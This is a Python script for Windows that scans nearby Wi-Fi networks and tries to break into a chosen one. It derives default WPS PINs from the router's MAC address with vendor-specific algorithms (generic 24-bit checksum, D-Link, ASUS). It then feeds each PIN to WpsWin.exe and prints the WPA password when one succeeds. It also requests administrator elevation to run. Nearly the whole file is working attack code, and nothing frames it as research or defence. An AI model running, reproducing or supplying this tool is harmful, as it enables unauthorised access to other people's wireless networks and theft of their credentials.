import ctypes, sys
from math import floor
import subprocess
import sys
from time import sleep
import re

def run_command(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    for LINE in iter(p.stdout.readline, b''):
        if LINE:
            yield LINE
    while p.poll() is None:
        sleep(.1)
    err = p.stderr.read()
    if p.returncode != 0:
        print("" + err)


def connect(ESSID, PIN):
    cmd = 'WpsWin.exe Action=Registrar ESSID="%s" PIN=%s' % (ESSID, str(PIN))
    sleep(1)
    for LINE in run_command(cmd):
        LINE = LINE.decode('cp866')
        if "Asociacion fallida" in LINE:
            print("Connection with %s hasn't been established!" % ESSID)
            return
        elif "Pin incorrecto" in LINE:
            print("Pin invalid!")
            return
        elif "Wpa Key" in LINE:
            print("\nTRUE PIN FOUND!\nGetting the Wi-Fi password...\n")
            print(LINE)
            sleep(5)
            input()
            sys.exit()

def checksum(mac):
  mac %= 10000000
  var = 0
  temp = mac
  while temp:
    var += 3 * (temp % 10)
    temp = floor(temp / 10)
    var += temp % 10
    temp = floor(temp / 10)
  return (mac * 10) + ((10 - (var % 10)) % 10)


def pin24(BSSID):
    temp = int(BSSID, 16) & 0xFFFFFF
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)


def pinDLink(BSSID):
    temp = (int(BSSID, 16) & 0xFFFFFF) ^ 0x55AA55
    temp ^= ((temp & 0xF) << 4) | ((temp & 0xF) << 8) | ((temp & 0xF) << 12) | ((temp & 0xF) << 16) | (
                (temp & 0xF) << 20)
    temp %= 10000000
    if temp < 1000000:
        temp += ((temp % 9) * 1000000) + 1000000
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)


def pinDLinkInc1(BSSID):
    temp = int(BSSID, 16) + 1
    return pinDLink(hex(temp))


def pinASUS(BSSID):
    temp = format(int(BSSID, 16), '02x')
    temp = str(temp).zfill(12)
    var = [int(temp[0:2], 16), int(temp[2:4], 16), int(temp[4:6], 16), int(temp[6:8], 16),
           int(temp[8:10], 16), int(temp[10:12], 16)]
    pin = []
    for i in range(7):
        pin.append((var[i % 6] + var[5]) % (10 - ((i + var[1] + var[2] + var[3] + var[4] + var[5]) % 7)))
    temp = int(''.join(str(i) for i in pin))
    temp = checksum(temp)
    temp = str(int(temp))
    return temp.zfill(8)



def main():
  network = 0
  results = run_command("netsh wlan show networks mode=bssid")
  results = [i for i in results]
  ssids = []
  bssids = []
  for line in results:
    line = line.decode('cp866')
    if "BSSID" in line:
      bssids.append(re.sub('BSSID [\d]+:', '', line.strip()).strip())
    elif "SSID" in line:
      ssids.append(re.sub('SSID [\d]+:', '', line.strip()).strip())
  i = 0
  print ("Available wireless networks at the moment:\n")
  for j in ssids:
    i += 1
    print ("%d - %s" % (i, j))
  while (network == "") or (int(network) < 1) or (int(network) > i):
    print
    network = input("\nChoose the wireless network > ")
  network = int(network) - 1
  macbssid = bssids[network].upper()
  mac = macbssid.replace(":", "").replace("-", "").replace(" ", "").replace(".", "")
  wifiname = ssids[network]
  algos = [pin24, pinDLink, pinDLinkInc1, pinASUS]
  for i in algos:
      pin = i(mac)
      print("\nTrying connect to %s via %s technique with PIN: %s" % (wifiname, i.__name__, pin))
      connect(wifiname, pin)
      sleep(3)

if ctypes.windll.shell32.IsUserAnAdmin():
  if __name__ == "__main__":
    main()

else:
  ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

